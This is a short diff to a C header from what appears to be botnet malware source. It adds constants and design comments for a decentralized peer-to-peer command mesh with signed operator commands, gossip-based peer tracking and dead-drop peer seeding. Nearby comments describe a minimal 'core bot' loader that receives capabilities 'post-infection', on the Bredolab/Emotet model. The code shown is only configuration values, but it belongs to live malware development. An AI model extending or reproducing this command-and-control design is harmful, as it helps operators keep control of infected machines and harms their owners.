@@ -200,6 +200,19 @@
 #define RELAY_HANDSHAKE_TIMEOUT 5000    /* ms: auth + target connect */
 #define RELAY_TUNNEL_TIMEOUT    120000  /* ms: tunnel idle timeout */
 
+/* ── P2P Command/Peer Mesh (#139) ─────────────────────────── */
+/* Decentralized peer mesh reusing relay.c's multi-hop design posture and
+ * deaddrop.c's trust model. Bounded peer table (MESH_PEER_MAX), gossip
+ * with TTL eviction, ed25519-signed commands verified against an operator
+ * pubkey (fail-closed). Off by default; requires relay_token (frame auth)
+ * + operator pubkey. MESH_DEFAULT_PORT is the mesh listener; the peer-seed
+ * list is mesh_static_peers_N (config) + the dead-drop `peers=` field. */
+#define MESH_DEFAULT_PORT       1082
+#define MESH_PEER_MAX           32
+#define MESH_PEER_TTL           600     /* s before a silent peer is evicted */
+#define MESH_HANDSHAKE_TIMEOUT  5000    /* ms */
+#define MESH_HOP_MAX            8       /* == relay.c RELAY_MAX_HOPS */
+
 /* ── Loader/Plugin Framework (#92) ─────────────────────── */
 /* The Bredolab/Emotet split: the core bot stays a minimal loader and
  * capabilities are pushed post-infection, dispatched by name from the
